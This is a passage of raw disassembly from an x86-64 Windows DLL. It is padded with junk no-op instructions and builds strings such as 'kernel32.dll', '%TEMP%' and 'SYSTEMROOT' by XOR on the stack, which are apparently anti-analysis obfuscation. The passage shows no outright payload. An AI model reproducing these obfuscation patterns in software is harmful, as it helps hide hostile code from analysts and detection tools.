   180004154:	48 89 e4             	mov    %rsp,%rsp
   180004157:	4d 8d 12             	lea    (%r10),%r10
   18000415a:	48 8d 36             	lea    (%rsi),%rsi
   18000415d:	48 8d 00             	lea    (%rax),%rax
   180004160:	52                   	push   %rdx
   180004161:	90                   	nop
   180004162:	5a                   	pop    %rdx
   180004163:	e8 c8 d0 ff ff       	call   0x180001230
   180004168:	c7 44 24 30 2a ed a9 	movl   $0xa9ed2a,0x30(%rsp)
   18000416f:	00 
   180004170:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180004174:	48 8d 00             	lea    (%rax),%rax
   180004177:	4d 87 e4             	xchg   %r12,%r12
   18000417a:	4d 87 c9             	xchg   %r9,%r9
   18000417d:	48 89 db             	mov    %rbx,%rbx
   180004180:	90                   	nop
   180004181:	48 87 ed             	xchg   %rbp,%rbp
   180004184:	48 8d 1b             	lea    (%rbx),%rbx
   180004187:	48 8d 36             	lea    (%rsi),%rsi
   18000418a:	57                   	push   %rdi
   18000418b:	5f                   	pop    %rdi
   18000418c:	48 89 ed             	mov    %rbp,%rbp
   18000418f:	4d 8d 1b             	lea    (%r11),%r11
   180004192:	4d 89 ed             	mov    %r13,%r13
   180004195:	57                   	push   %rdi
   180004196:	48 89 ed             	mov    %rbp,%rbp
   180004199:	5f                   	pop    %rdi
   18000419a:	41 54                	push   %r12
   18000419c:	48 89 e4             	mov    %rsp,%rsp
   18000419f:	41 5c                	pop    %r12
   1800041a1:	31 c0                	xor    %eax,%eax
   1800041a3:	48 81 c4 e8 00 00 00 	add    $0xe8,%rsp
   1800041aa:	c3                   	ret
   1800041ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800041b0:	56                   	push   %rsi
   1800041b1:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   1800041b8:	b9 1d 03 00 00       	mov    $0x31d,%ecx
   1800041bd:	e8 8e e0 ff ff       	call   0x180002250
   1800041c2:	48 89 e4             	mov    %rsp,%rsp
   1800041c5:	48 89 ed             	mov    %rbp,%rbp
   1800041c8:	48 87 db             	xchg   %rbx,%rbx
   1800041cb:	4d 8d 09             	lea    (%r9),%r9
   1800041ce:	48 8d 0d 9f e6 01 00 	lea    0x1e69f(%rip),%rcx        # 0x180022874
   1800041d5:	ff 15 6d 20 02 00    	call   *0x2206d(%rip)        # 0x180026248
   1800041db:	48 89 c9             	mov    %rcx,%rcx
   1800041de:	c7 44 24 2c 6b 00 00 	movl   $0x6b,0x2c(%rsp)
   1800041e5:	00 
   1800041e6:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800041ea:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   1800041ef:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800041f3:	83 f0 0e             	xor    $0xe,%eax
   1800041f6:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   1800041fb:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800041ff:	83 f0 19             	xor    $0x19,%eax
   180004202:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   180004207:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000420b:	83 f0 05             	xor    $0x5,%eax
   18000420e:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   180004213:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004217:	83 f0 0e             	xor    $0xe,%eax
   18000421a:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   18000421f:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004223:	83 f0 07             	xor    $0x7,%eax
   180004226:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   18000422b:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000422f:	83 f0 58             	xor    $0x58,%eax
   180004232:	66 89 44 24 3c       	mov    %ax,0x3c(%rsp)
   180004237:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000423b:	83 f0 59             	xor    $0x59,%eax
   18000423e:	66 89 44 24 3e       	mov    %ax,0x3e(%rsp)
   180004243:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004247:	83 f0 45             	xor    $0x45,%eax
   18000424a:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   18000424f:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004253:	83 f0 0f             	xor    $0xf,%eax
   180004256:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   18000425b:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000425f:	83 f0 07             	xor    $0x7,%eax
   180004262:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   180004267:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000426b:	83 f0 07             	xor    $0x7,%eax
   18000426e:	66 89 44 24 46       	mov    %ax,0x46(%rsp)
   180004273:	66 c7 44 24 48 00 00 	movw   $0x0,0x48(%rsp)
   18000427a:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   18000427f:	ff 15 ab 1e 02 00    	call   *0x21eab(%rip)        # 0x180026130
   180004285:	c7 44 24 30 29 e2 95 	movl   $0x95e229,0x30(%rsp)
   18000428c:	00 
   18000428d:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180004291:	57                   	push   %rdi
   180004292:	41 52                	push   %r10
   180004294:	41 5a                	pop    %r10
   180004296:	5f                   	pop    %rdi
   180004297:	b9 ba 01 00 00       	mov    $0x1ba,%ecx
   18000429c:	e8 ff da ff ff       	call   0x180001da0
   1800042a1:	53                   	push   %rbx
   1800042a2:	52                   	push   %rdx
   1800042a3:	5a                   	pop    %rdx
   1800042a4:	5b                   	pop    %rbx
   1800042a5:	c7 44 24 30 68 00 00 	movl   $0x68,0x30(%rsp)
   1800042ac:	00 
   1800042ad:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1800042b2:	ff 15 a0 1e 02 00    	call   *0x21ea0(%rip)        # 0x180026158
   1800042b8:	ff 15 da 1e 02 00    	call   *0x21eda(%rip)        # 0x180026198
   1800042be:	89 c6                	mov    %eax,%esi
   1800042c0:	ff 15 ea 1d 02 00    	call   *0x21dea(%rip)        # 0x1800260b0
   1800042c6:	0f af c6             	imul   %esi,%eax
   1800042c9:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1800042cd:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800042d1:	41 52                	push   %r10
   1800042d3:	41 56                	push   %r14
   1800042d5:	41 5e                	pop    %r14
   1800042d7:	41 5a                	pop    %r10
   1800042d9:	c7 44 24 30 1a 9e ee 	movl   $0xee9e1a,0x30(%rsp)
   1800042e0:	00 
   1800042e1:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800042e5:	e8 26 df ff ff       	call   0x180002210
   1800042ea:	48 87 e4             	xchg   %rsp,%rsp
   1800042ed:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   1800042f1:	e8 1a d2 ff ff       	call   0x180001510
   1800042f6:	90                   	nop
   1800042f7:	48 8d 09             	lea    (%rcx),%rcx
   1800042fa:	4d 89 ff             	mov    %r15,%r15
   1800042fd:	4d 8d 1b             	lea    (%r11),%r11
   180004300:	4d 8d 09             	lea    (%r9),%r9
   180004303:	b9 06 00 00 00       	mov    $0x6,%ecx
   180004308:	ff 15 fa 1e 02 00    	call   *0x21efa(%rip)        # 0x180026208
   18000430e:	90                   	nop
   18000430f:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   180004316:	5e                   	pop    %rsi
   180004317:	c3                   	ret
   180004318:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   18000431f:	00 
   180004320:	48 83 ec 28          	sub    $0x28,%rsp
   180004324:	b9 5b 02 00 00       	mov    $0x25b,%ecx
   180004329:	e8 e2 d2 ff ff       	call   0x180001610
   18000432e:	4d 87 d2             	xchg   %r10,%r10
   180004331:	4d 87 c0             	xchg   %r8,%r8
   180004334:	48 89 c0             	mov    %rax,%rax
   180004337:	ff 15 83 1d 02 00    	call   *0x21d83(%rip)        # 0x1800260c0
   18000433d:	90                   	nop
   18000433e:	48 87 ed             	xchg   %rbp,%rbp
   180004341:	48 87 db             	xchg   %rbx,%rbx
   180004344:	90                   	nop
   180004345:	48 8d 0d 1c e5 01 00 	lea    0x1e51c(%rip),%rcx        # 0x180022868
   18000434c:	ff 15 ce 1d 02 00    	call   *0x21dce(%rip)        # 0x180026120
   180004352:	48 8d 12             	lea    (%rdx),%rdx
   180004355:	4d 8d 00             	lea    (%r8),%r8
   180004358:	4d 87 db             	xchg   %r11,%r11
   18000435b:	41 55                	push   %r13
   18000435d:	41 5d                	pop    %r13
   18000435f:	e8 9c da ff ff       	call   0x180001e00
   180004364:	ba 00 10 00 00       	mov    $0x1000,%edx
   180004369:	31 c9                	xor    %ecx,%ecx
   18000436b:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   180004371:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   180004377:	ff 15 33 1f 02 00    	call   *0x21f33(%rip)        # 0x1800262b0
   18000437d:	48 85 c0             	test   %rax,%rax
   180004380:	74 11                	je     0x180004393
   180004382:	48 89 c1             	mov    %rax,%rcx
   180004385:	31 d2                	xor    %edx,%edx
   180004387:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
   18000438d:	ff 15 25 1f 02 00    	call   *0x21f25(%rip)        # 0x1800262b8
   180004393:	ff 15 0f 1e 02 00    	call   *0x21e0f(%rip)        # 0x1800261a8
   180004399:	48 8d 00             	lea    (%rax),%rax
   18000439c:	41 56                	push   %r14
   18000439e:	90                   	nop
   18000439f:	41 5e                	pop    %r14
   1800043a1:	c7 44 24 24 8c cc 1d 	movl   $0x1dcc8c,0x24(%rsp)
   1800043a8:	00 
   1800043a9:	8b 44 24 24          	mov    0x24(%rsp),%eax
   1800043ad:	4d 87 c0             	xchg   %r8,%r8
   1800043b0:	4d 89 f6             	mov    %r14,%r14
   1800043b3:	48 87 ed             	xchg   %rbp,%rbp
   1800043b6:	4d 89 db             	mov    %r11,%r11
   1800043b9:	4d 87 c9             	xchg   %r9,%r9
   1800043bc:	48 87 ed             	xchg   %rbp,%rbp
   1800043bf:	41 55                	push   %r13
   1800043c1:	41 5d                	pop    %r13
   1800043c3:	e8 28 e9 ff ff       	call   0x180002cf0
   1800043c8:	41 50                	push   %r8
   1800043ca:	41 52                	push   %r10
   1800043cc:	41 5a                	pop    %r10
   1800043ce:	41 58                	pop    %r8
   1800043d0:	4d 87 e4             	xchg   %r12,%r12
   1800043d3:	4d 8d 1b             	lea    (%r11),%r11
   1800043d6:	48 87 c9             	xchg   %rcx,%rcx
   1800043d9:	31 c0                	xor    %eax,%eax
   1800043db:	48 83 c4 28          	add    $0x28,%rsp
   1800043df:	c3                   	ret
   1800043e0:	48 83 ec 68          	sub    $0x68,%rsp
   1800043e4:	b9 51 01 00 00       	mov    $0x151,%ecx
   1800043e9:	e8 a2 d3 ff ff       	call   0x180001790
   1800043ee:	ff 15 a4 1d 02 00    	call   *0x21da4(%rip)        # 0x180026198
   1800043f4:	b9 06 00 00 00       	mov    $0x6,%ecx
   1800043f9:	ff 15 09 1e 02 00    	call   *0x21e09(%rip)        # 0x180026208
   1800043ff:	c7 44 24 38 b0 4f ee 	movl   $0xee4fb0,0x38(%rsp)
   180004406:	00 
   180004407:	8b 44 24 38          	mov    0x38(%rsp),%eax
   18000440b:	4d 87 d2             	xchg   %r10,%r10
   18000440e:	4d 89 c9             	mov    %r9,%r9
   180004411:	e8 8a d3 ff ff       	call   0x1800017a0
   180004416:	41 50                	push   %r8
   180004418:	41 58                	pop    %r8
   18000441a:	b9 4e 02 00 00       	mov    $0x24e,%ecx
   18000441f:	e8 bc db ff ff       	call   0x180001fe0
   180004424:	48 87 db             	xchg   %rbx,%rbx
   180004427:	48 89 f6             	mov    %rsi,%rsi
   18000442a:	4d 87 c9             	xchg   %r9,%r9
   18000442d:	4d 89 ff             	mov    %r15,%r15
   180004430:	c7 44 24 34 90 00 00 	movl   $0x90,0x34(%rsp)
   180004437:	00 
   180004438:	8b 44 24 34          	mov    0x34(%rsp),%eax
   18000443c:	35 d3 00 00 00       	xor    $0xd3,%eax
   180004441:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   180004446:	8b 44 24 34          	mov    0x34(%rsp),%eax
   18000444a:	35 aa 00 00 00       	xor    $0xaa,%eax
   18000444f:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   180004454:	8b 44 24 34          	mov    0x34(%rsp),%eax
   180004458:	35 cc 00 00 00       	xor    $0xcc,%eax
   18000445d:	66 89 44 24 3c       	mov    %ax,0x3c(%rsp)
   180004462:	66 c7 44 24 3e 00 00 	movw   $0x0,0x3e(%rsp)
   180004469:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   18000446e:	ff 15 54 1c 02 00    	call   *0x21c54(%rip)        # 0x1800260c8
   180004474:	41 52                	push   %r10
   180004476:	41 54                	push   %r12
   180004478:	41 5c                	pop    %r12
   18000447a:	41 5a                	pop    %r10
   18000447c:	48 8d 05 f7 e3 01 00 	lea    0x1e3f7(%rip),%rax        # 0x18002287a
   180004483:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180004488:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   18000448f:	00 
   180004490:	4c 8d 05 e7 e3 01 00 	lea    0x1e3e7(%rip),%r8        # 0x18002287e
   180004497:	b9 7f 00 00 00       	mov    $0x7f,%ecx
   18000449c:	31 d2                	xor    %edx,%edx
   18000449e:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1800044a4:	ff 15 36 1b 02 00    	call   *0x21b36(%rip)        # 0x180025fe0
   1800044aa:	48 89 f6             	mov    %rsi,%rsi
   1800044ad:	4d 89 ff             	mov    %r15,%r15
   1800044b0:	48 87 db             	xchg   %rbx,%rbx
   1800044b3:	48 89 c0             	mov    %rax,%rax
   1800044b6:	4d 8d 00             	lea    (%r8),%r8
   1800044b9:	4d 87 d2             	xchg   %r10,%r10
   1800044bc:	e8 4f d0 ff ff       	call   0x180001510
   1800044c1:	c7 44 24 38 5a 07 73 	movl   $0x73075a,0x38(%rsp)
   1800044c8:	00 
   1800044c9:	8b 44 24 38          	mov    0x38(%rsp),%eax
   1800044cd:	41 52                	push   %r10
   1800044cf:	41 5a                	pop    %r10
   1800044d1:	e8 2a d9 ff ff       	call   0x180001e00
   1800044d6:	90                   	nop
   1800044d7:	90                   	nop
   1800044d8:	48 8d 36             	lea    (%rsi),%rsi
   1800044db:	e8 50 d1 ff ff       	call   0x180001630
   1800044e0:	4d 87 ed             	xchg   %r13,%r13
   1800044e3:	90                   	nop
   1800044e4:	90                   	nop
   1800044e5:	90                   	nop
   1800044e6:	48 87 e4             	xchg   %rsp,%rsp
   1800044e9:	90                   	nop
   1800044ea:	4d 8d 1b             	lea    (%r11),%r11
   1800044ed:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   1800044f2:	ff 15 40 1c 02 00    	call   *0x21c40(%rip)        # 0x180026138
   1800044f8:	8b 44 24 58          	mov    0x58(%rsp),%eax
   1800044fc:	48 83 c4 68          	add    $0x68,%rsp
   180004500:	c3                   	ret
   180004501:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   180004508:	0f 1f 84 00 00 00 00 
   18000450f:	00 
   180004510:	48 81 ec 38 02 00 00 	sub    $0x238,%rsp
   180004517:	b9 9d 01 00 00       	mov    $0x19d,%ecx
   18000451c:	e8 9f d4 ff ff       	call   0x1800019c0
   180004521:	53                   	push   %rbx
   180004522:	48 87 e4             	xchg   %rsp,%rsp
   180004525:	5b                   	pop    %rbx
   180004526:	e8 b5 d4 ff ff       	call   0x1800019e0
   18000452b:	ff 15 7f 1c 02 00    	call   *0x21c7f(%rip)        # 0x1800261b0
   180004531:	48 8d 15 4a e3 01 00 	lea    0x1e34a(%rip),%rdx        # 0x180022882
   180004538:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   18000453d:	b9 01 00 00 00       	mov    $0x1,%ecx
   180004542:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180004548:	ff 15 1a 1c 02 00    	call   *0x21c1a(%rip)        # 0x180026168
   18000454e:	90                   	nop
   18000454f:	4d 8d 09             	lea    (%r9),%r9
   180004552:	90                   	nop
   180004553:	4d 89 c9             	mov    %r9,%r9
   180004556:	4d 87 ed             	xchg   %r13,%r13
   180004559:	4d 87 e4             	xchg   %r12,%r12
   18000455c:	ff 15 4e 1b 02 00    	call   *0x21b4e(%rip)        # 0x1800260b0
   180004562:	41 56                	push   %r14
   180004564:	41 5e                	pop    %r14
   180004566:	c7 44 24 30 2f 9b 67 	movl   $0x679b2f,0x30(%rsp)
   18000456d:	00 
   18000456e:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180004572:	4d 87 ff             	xchg   %r15,%r15
   180004575:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   180004579:	4d 89 d2             	mov    %r10,%r10
   18000457c:	4d 8d 24 24          	lea    (%r12),%r12
   180004580:	48 89 f6             	mov    %rsi,%rsi
   180004583:	48 87 e4             	xchg   %rsp,%rsp
   180004586:	4d 8d 09             	lea    (%r9),%r9
   180004589:	4d 8d 24 24          	lea    (%r12),%r12
   18000458d:	41 52                	push   %r10
   18000458f:	41 50                	push   %r8
   180004591:	41 58                	pop    %r8
   180004593:	41 5a                	pop    %r10
   180004595:	57                   	push   %rdi
   180004596:	50                   	push   %rax
   180004597:	58                   	pop    %rax
   180004598:	5f                   	pop    %rdi
   180004599:	4d 87 c9             	xchg   %r9,%r9
   18000459c:	4d 8d 3f             	lea    (%r15),%r15
   18000459f:	48 89 e4             	mov    %rsp,%rsp
   1800045a2:	c7 44 24 2c 2e 00 00 	movl   $0x2e,0x2c(%rsp)
   1800045a9:	00 
   1800045aa:	48 8d 4c 24 2c       	lea    0x2c(%rsp),%rcx
   1800045af:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1800045b4:	ba 04 01 00 00       	mov    $0x104,%edx
   1800045b9:	45 31 c9             	xor    %r9d,%r9d
   1800045bc:	ff 15 2e 1b 02 00    	call   *0x21b2e(%rip)        # 0x1800260f0
   1800045c2:	90                   	nop
   1800045c3:	48 81 c4 38 02 00 00 	add    $0x238,%rsp
   1800045ca:	c3                   	ret
   1800045cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800045d0:	48 81 ec 58 02 00 00 	sub    $0x258,%rsp
   1800045d7:	b9 e0 02 00 00       	mov    $0x2e0,%ecx
   1800045dc:	e8 cf db ff ff       	call   0x1800021b0
   1800045e1:	90                   	nop
   1800045e2:	4d 8d 24 24          	lea    (%r12),%r12
   1800045e6:	e8 f5 d3 ff ff       	call   0x1800019e0
   1800045eb:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1800045f0:	ff 15 82 1b 02 00    	call   *0x21b82(%rip)        # 0x180026178
   1800045f6:	48 87 ed             	xchg   %rbp,%rbp
   1800045f9:	4d 87 db             	xchg   %r11,%r11
   1800045fc:	4d 89 c9             	mov    %r9,%r9
   1800045ff:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180004604:	31 c9                	xor    %ecx,%ecx
   180004606:	ff 15 6c 1a 02 00    	call   *0x21a6c(%rip)        # 0x180026078
   18000460c:	4d 87 ed             	xchg   %r13,%r13
   18000460f:	48 87 db             	xchg   %rbx,%rbx
   180004612:	53                   	push   %rbx
   180004613:	5b                   	pop    %rbx
   180004614:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   180004619:	ff 15 41 1b 02 00    	call   *0x21b41(%rip)        # 0x180026160
   18000461f:	c7 44 24 50 db 10 3a 	movl   $0x3a10db,0x50(%rsp)
   180004626:	00 
   180004627:	8b 44 24 50          	mov    0x50(%rsp),%eax
   18000462b:	41 57                	push   %r15
   18000462d:	4d 87 c0             	xchg   %r8,%r8
   180004630:	41 5f                	pop    %r15
   180004632:	e8 49 ca ff ff       	call   0x180001080
   180004637:	41 57                	push   %r15
   180004639:	41 5f                	pop    %r15
   18000463b:	e8 a0 d3 ff ff       	call   0x1800019e0
   180004640:	b9 3e 01 00 00       	mov    $0x13e,%ecx
   180004645:	e8 76 d2 ff ff       	call   0x1800018c0
   18000464a:	48 8d 09             	lea    (%rcx),%rcx
   18000464d:	48 8d 36             	lea    (%rsi),%rsi
   180004650:	4d 89 db             	mov    %r11,%r11
   180004653:	4d 87 c9             	xchg   %r9,%r9
   180004656:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   18000465a:	48 87 db             	xchg   %rbx,%rbx
   18000465d:	e8 ae db ff ff       	call   0x180002210
   180004662:	ff 15 30 1b 02 00    	call   *0x21b30(%rip)        # 0x180026198
   180004668:	48 87 db             	xchg   %rbx,%rbx
   18000466b:	48 87 d2             	xchg   %rdx,%rdx
   18000466e:	4d 8d 1b             	lea    (%r11),%r11
   180004671:	90                   	nop
   180004672:	4d 87 e4             	xchg   %r12,%r12
   180004675:	c7 44 24 2c 7e 00 00 	movl   $0x7e,0x2c(%rsp)
   18000467c:	00 
   18000467d:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004681:	83 f0 5b             	xor    $0x5b,%eax
   180004684:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   180004689:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000468d:	83 f0 2a             	xor    $0x2a,%eax
   180004690:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   180004695:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004699:	83 f0 3b             	xor    $0x3b,%eax
   18000469c:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   1800046a1:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800046a5:	83 f0 33             	xor    $0x33,%eax
   1800046a8:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   1800046ad:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800046b1:	83 f0 2e             	xor    $0x2e,%eax
   1800046b4:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   1800046b9:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800046bd:	83 f0 5b             	xor    $0x5b,%eax
   1800046c0:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   1800046c5:	66 c7 44 24 3c 00 00 	movw   $0x0,0x3c(%rsp)
   1800046cc:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1800046d1:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1800046d6:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1800046dc:	ff 15 36 19 02 00    	call   *0x21936(%rip)        # 0x180026018
   1800046e2:	48 89 d2             	mov    %rdx,%rdx
   1800046e5:	4d 89 e4             	mov    %r12,%r12
   1800046e8:	4d 87 db             	xchg   %r11,%r11
   1800046eb:	e8 40 cb ff ff       	call   0x180001230
   1800046f0:	ff 15 5a 1a 02 00    	call   *0x21a5a(%rip)        # 0x180026150
   1800046f6:	48 8d 36             	lea    (%rsi),%rsi
   1800046f9:	4d 8d 3f             	lea    (%r15),%r15
   1800046fc:	48 89 c0             	mov    %rax,%rax
   1800046ff:	c7 44 24 50 ae e1 be 	movl   $0xbee1ae,0x50(%rsp)
   180004706:	00 
   180004707:	8b 44 24 50          	mov    0x50(%rsp),%eax
   18000470b:	41 53                	push   %r11
   18000470d:	48 89 e4             	mov    %rsp,%rsp
   180004710:	41 5b                	pop    %r11
   180004712:	4d 87 e4             	xchg   %r12,%r12
   180004715:	4d 87 c0             	xchg   %r8,%r8
   180004718:	b9 3b 03 00 00       	mov    $0x33b,%ecx
   18000471d:	e8 3e d8 ff ff       	call   0x180001f60
   180004722:	4d 8d 09             	lea    (%r9),%r9
   180004725:	48 89 c9             	mov    %rcx,%rcx
   180004728:	ff 15 8a 19 02 00    	call   *0x2198a(%rip)        # 0x1800260b8
   18000472e:	41 54                	push   %r12
   180004730:	90                   	nop
   180004731:	41 5c                	pop    %r12
   180004733:	c7 44 24 2c 91 00 00 	movl   $0x91,0x2c(%rsp)
   18000473a:	00 
   18000473b:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000473f:	35 c2 00 00 00       	xor    $0xc2,%eax
   180004744:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   180004749:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000474d:	35 c8 00 00 00       	xor    $0xc8,%eax
   180004752:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   180004757:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000475b:	35 c2 00 00 00       	xor    $0xc2,%eax
   180004760:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   180004765:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004769:	35 c5 00 00 00       	xor    $0xc5,%eax
   18000476e:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   180004773:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004777:	35 d4 00 00 00       	xor    $0xd4,%eax
   18000477c:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   180004781:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004785:	35 dc 00 00 00       	xor    $0xdc,%eax
   18000478a:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   18000478f:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004793:	35 c3 00 00 00       	xor    $0xc3,%eax
   180004798:	66 89 44 24 3c       	mov    %ax,0x3c(%rsp)
   18000479d:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800047a1:	35 de 00 00 00       	xor    $0xde,%eax
   1800047a6:	66 89 44 24 3e       	mov    %ax,0x3e(%rsp)
   1800047ab:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800047af:	35 de 00 00 00       	xor    $0xde,%eax
   1800047b4:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   1800047b9:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800047bd:	35 c5 00 00 00       	xor    $0xc5,%eax
   1800047c2:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   1800047c7:	66 c7 44 24 44 00 00 	movw   $0x0,0x44(%rsp)
   1800047ce:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1800047d3:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1800047d8:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1800047de:	ff 15 f4 18 02 00    	call   *0x218f4(%rip)        # 0x1800260d8
   1800047e4:	90                   	nop
   1800047e5:	90                   	nop
   1800047e6:	90                   	nop
   1800047e7:	41 53                	push   %r11
   1800047e9:	4d 87 f6             	xchg   %r14,%r14
   1800047ec:	41 5b                	pop    %r11
   1800047ee:	c7 44 24 50 81 7c 8a 	movl   $0x8a7c81,0x50(%rsp)
   1800047f5:	00 
   1800047f6:	8b 44 24 50          	mov    0x50(%rsp),%eax
   1800047fa:	57                   	push   %rdi
   1800047fb:	5f                   	pop    %rdi
   1800047fc:	41 52                	push   %r10
   1800047fe:	4d 89 f6             	mov    %r14,%r14
   180004801:	41 5a                	pop    %r10
   180004803:	4d 89 e4             	mov    %r12,%r12
   180004806:	48 89 e4             	mov    %rsp,%rsp
   180004809:	4d 89 c0             	mov    %r8,%r8
   18000480c:	48 89 c9             	mov    %rcx,%rcx
   18000480f:	53                   	push   %rbx
   180004810:	48 89 c9             	mov    %rcx,%rcx
   180004813:	5b                   	pop    %rbx
   180004814:	31 c0                	xor    %eax,%eax
   180004816:	48 81 c4 58 02 00 00 	add    $0x258,%rsp
   18000481d:	c3                   	ret
   18000481e:	66 90                	xchg   %ax,%ax
   180004820:	48 83 ec 38          	sub    $0x38,%rsp
   180004824:	c7 44 24 2c 3a 00 00 	movl   $0x3a,0x2c(%rsp)
   18000482b:	00 
   18000482c:	4d 89 f6             	mov    %r14,%r14
   18000482f:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004833:	4d 89 f6             	mov    %r14,%r14
   180004836:	e8 45 c8 ff ff       	call   0x180001080
   18000483b:	b9 a1 01 00 00       	mov    $0x1a1,%ecx
   180004840:	e8 cb c9 ff ff       	call   0x180001210
   180004845:	ff 15 35 18 02 00    	call   *0x21835(%rip)        # 0x180026080
   18000484b:	52                   	push   %rdx
   18000484c:	50                   	push   %rax
   18000484d:	58                   	pop    %rax
   18000484e:	5a                   	pop    %rdx
   18000484f:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   180004854:	31 c9                	xor    %ecx,%ecx
   180004856:	31 d2                	xor    %edx,%edx
   180004858:	ff 15 ca 18 02 00    	call   *0x218ca(%rip)        # 0x180026128
   18000485e:	4d 87 f6             	xchg   %r14,%r14
   180004861:	48 87 db             	xchg   %rbx,%rbx
   180004864:	48 87 f6             	xchg   %rsi,%rsi
   180004867:	4d 89 ff             	mov    %r15,%r15
   18000486a:	48 8d 3f             	lea    (%rdi),%rdi
   18000486d:	4d 87 ff             	xchg   %r15,%r15
   180004870:	48 8d 12             	lea    (%rdx),%rdx
   180004873:	4d 8d 12             	lea    (%r10),%r10
   180004876:	31 c9                	xor    %ecx,%ecx
   180004878:	ff 15 ba 17 02 00    	call   *0x217ba(%rip)        # 0x180026038
   18000487e:	83 f8 ff             	cmp    $0xffffffff,%eax
   180004881:	74 08                	je     0x18000488b
   180004883:	89 c1                	mov    %eax,%ecx
   180004885:	ff 15 b5 17 02 00    	call   *0x217b5(%rip)        # 0x180026040
   18000488b:	90                   	nop
   18000488c:	4d 8d 36             	lea    (%r14),%r14
   18000488f:	90                   	nop
   180004890:	4d 89 c9             	mov    %r9,%r9
   180004893:	ff 15 1f 18 02 00    	call   *0x2181f(%rip)        # 0x1800260b8
